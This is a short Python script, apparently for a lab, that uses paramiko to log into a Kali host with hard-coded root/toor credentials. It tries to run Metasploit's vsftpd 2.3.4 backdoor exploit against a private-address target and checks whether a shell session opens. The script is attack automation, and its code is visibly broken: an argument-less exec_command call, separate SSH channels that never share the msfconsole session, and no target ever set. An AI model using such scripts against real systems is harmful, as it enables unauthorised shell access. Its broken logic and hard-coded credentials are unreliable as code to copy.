import sys
import paramiko
import time


kaliLinuxHost = '10.0.1.4'
targetHost = '10.0.1.5'
kaliUser ='root'
kaliPassword = 'toor'
sshSession=paramiko.SSHClient()
sshSession.load_system_host_keys()
sshSession.set_missing_host_key_policy(paramiko.WarningPolicy)

sshSession.connect(hostname=kaliLinuxHost,username=kaliUser,password=kaliPassword)
sshSession.exec_command()
def runtests():
    exploitCommands =['exploit/unix/ftp/vsftpd_234_backdoor']

    #connect to msf
    sshSession.exec_command('msfconsole')

    #execute the exploit
    for command in exploitCommands:
        sshSession.exec_command('use ' + command)
        stdin, stdout, stderr = sshSession.exec_command('exploit')
        time.sleep(5)
        stdin.close()
        result = False
        for line in stdout.read().splitlines():
            print(line)
            if 'Command shell session 1 opened ' in line:
                result = True
        if result:
            print('attack succeeds')
        else:
            print('attack fails')
        sshSession.exec_command('exit')




